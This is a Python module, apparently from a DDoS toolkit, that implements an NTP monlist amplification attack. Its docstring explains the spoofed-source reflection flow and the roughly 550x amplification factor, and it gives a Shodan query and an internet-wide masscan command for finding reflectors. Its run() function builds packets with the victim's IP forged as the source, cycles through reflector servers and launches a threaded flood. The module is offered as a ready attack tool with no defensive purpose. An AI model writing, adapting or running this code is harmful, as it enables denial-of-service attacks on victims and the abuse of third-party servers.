"""
modules/ntp_amp.py - MONLIST
NTP amplification (DRDoS). Amplification factor: ~300-550x.

How it works:
  NTP mode 7 "monlist" request = 8 bytes
  Server response = up to 4400 bytes (list of last 600 clients)
  Amplification = 4400 / 8 = ~550x

  Attack flow:
    Attacker -> NTP server (src=victim_ip, dst=reflector:123)
    NTP server -> victim_ip (massive response)

  Result: attacker sends 1 Mbps, victim receives ~550 Mbps.

Finding reflectors:
  Shodan: port:123 "monlist"
  Masscan: masscan -p123 0.0.0.0/0 --rate=100000

NTP monlist was disabled in NTPd 4.2.7p26+ (2013).
Still widely exploitable on unpatched embedded devices, routers.
"""

from floodles.core.packet_builder import PacketBuilder
from floodles.core.sender import FloodEngine


def run(
    victim_ip: str,
    reflectors: list[str],
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
) -> FloodEngine:
    """
    Launch NTP amplification attack.

    Args:
        victim_ip   : Target IP (spoofed source in packets).
        reflectors  : List of NTP server IPs to use as reflectors.
                      Obtain via Shodan: port:123 "monlist"
        threads     : Worker count.
        pps_limit   : PPS cap (per thread). Be mindful: actual traffic
                      hitting victim = pps_limit * amplification_factor.
        duration    : Duration in seconds.

    Returns:
        FloodEngine instance (already started).

    Note:
        Effective destination for the raw socket is the reflector IP.
        PacketBuilder.ntp_monlist() builds the packet with:
          src=victim_ip, dst=reflector
        FloodEngine sends to reflector (dst_ip argument).
        Since reflectors vary, we cycle through them in packet_fn.
    """
    import itertools
    builder = PacketBuilder()
    reflector_cycle = itertools.cycle(reflectors)

    def make_packet() -> bytes:
        reflector = next(reflector_cycle)
        return builder.ntp_monlist(
            reflector_ip=reflector,
            victim_ip=victim_ip,
        )

    # dst_ip for FloodEngine is less relevant here since each packet
    # already embeds the reflector as dst; we use sendto with extracted IP.
    # We pass the first reflector as nominal dst for socket init.
    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=reflectors[0],
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
